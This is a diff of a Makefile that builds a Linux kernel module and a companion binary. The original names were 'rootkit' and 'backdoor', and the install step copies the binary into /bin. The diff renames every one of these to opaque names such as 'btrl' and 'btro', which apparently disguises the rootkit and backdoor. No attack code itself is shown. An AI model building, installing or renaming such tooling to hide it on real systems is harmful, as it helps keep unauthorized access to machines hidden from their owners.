@@ -1,4 +1,4 @@
-obj-m += rootkit.o
+obj-m += btrl.o
 CC = gcc -Wall
 KDIR := /lib/modules/$(shell uname -r)/build
 PWD := $(shell pwd)
@@ -7,15 +7,15 @@ BUILD := $(PWD)/build
 all:
 	mkdir -p build
 	cp $(PWD)/Makefile $(PWD)/build/.
-	cp $(PWD)/src/rootkit.c $(PWD)/build/.
+	cp $(PWD)/src/btrl.c $(PWD)/build/.
 	make -C $(KDIR) M=$(BUILD) modules
 
-	gcc -o build/backdoor src/backdoor.c
+	gcc -o build/btll src/btll.c
 
 clean:
 	make -C $(KDIR) M=$(BUILD) clean
 	rm -rf build
-	rm /bin/rootk_backdoor
+	rm /bin/btro
 
 install:
-	cp $(PWD)/build/backdoor /bin/rootk_backdoor
+	cp $(PWD)/build/btll /bin/btro
